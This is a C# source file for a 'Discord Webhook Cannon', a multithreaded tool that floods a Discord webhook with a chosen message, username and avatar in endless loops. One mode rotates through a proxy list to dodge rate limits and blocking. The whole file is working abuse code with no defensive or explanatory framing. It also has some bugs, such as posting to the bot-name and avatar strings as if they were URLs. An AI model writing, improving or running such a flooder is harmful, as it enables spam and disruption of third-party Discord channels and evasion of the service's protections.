using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.IO;
using System.Net;
using System.Collections.Specialized;
using System.Net.NetworkInformation;
using System.Diagnostics;
using System.Net.Sockets;
using System.Windows.Forms;

namespace Discord_Webhook_Cannon
{
    class Cannon
    {
        private WebClient dWebClient;
        private static NameValueCollection discord = new NameValueCollection();

        public void StartProxyThreads(string webhook, string proxyList, string threads, string message, string avatarUrl, string botName, string time)
        {
            for(int i = 1; i <= Int32.Parse(threads); i++)
            {
                Thread thread = new Thread(() => { NukeWithProxy(webhook, proxyList, message,botName,avatarUrl, time); });
                thread.Start();
                Console.WriteLine("Started thread nr: " + i);
            }
        }
        public void StartThreads(string webhook, string threads, string message, string avatarUrl, string botName,string time)
        {
            for (int i = 1; i <= Int32.Parse(threads); i++)
            {
                Thread thread = new Thread(() => { Nuke(webhook, message, avatarUrl,botName,time); });
                thread.Start();
                Console.WriteLine("Started thread nr: " + i);
            }
        }

        public void NukeWithProxy(string webhook, string proxylist, string message, string botName,string avatarUrl, string time)
        {
            dWebClient = new WebClient();
            discord.Add("content", message);
            int i = 0;
            
            dWebClient.UploadValues(webhook, discord);

            string proxyUsername = "";
            string proxyPassword = "";

            foreach (string line in File.ReadAllLines(proxylist))
            {
                i++;
                Console.WriteLine("Req nr: " + i + " " + line);
                WebProxy proxy1 = new WebProxy("http://" + line);

                try
                {
                    while (true)
                    {
                        for (int j = 1; j <= Int32.Parse(time); j++)
                        {
                            Thread.Sleep(500);
                            proxy1.Credentials = new NetworkCredential(proxyUsername, proxyPassword);
                            dWebClient.Proxy = proxy1;
                            dWebClient.UploadValues(webhook, discord);
                            dWebClient.UploadValues(botName, discord);
                            dWebClient.UploadValues(avatarUrl, discord);
                        }
                        Thread.Sleep(10000);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                    continue;
                }
            }
        }
        public void Nuke(string webhook, string message,string avatarUrl,string botName, string time)
        {
            dWebClient = new WebClient();
            WebhookTypes(message,avatarUrl,botName);

            try
            {
                while (true)
                {
                    for (int j = 1; j <= Int32.Parse(time); j++)
                    {
                        Thread.Sleep(500);
                        dWebClient.UploadValues(webhook, discord);
                        //dWebClient.UploadValues(botName, discord);
                        //dWebClient.UploadValues(avatarUrl, discord);
                    }
                    Thread.Sleep(10000);
                }        
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
                DialogResult result = MessageBox.Show("Thrown exception", "Discord Webhook Cannon", MessageBoxButtons.OK);
                if (result == DialogResult.OK)
                {
                    Application.Exit();
                }
            }
        }
        public void WebhookTypes(string message, string avatarUrl,string botName)
        {
            discord.Add("content", message);
            discord.Add("avatar_url", avatarUrl);
            discord.Add("username", botName);
        }

    }
}
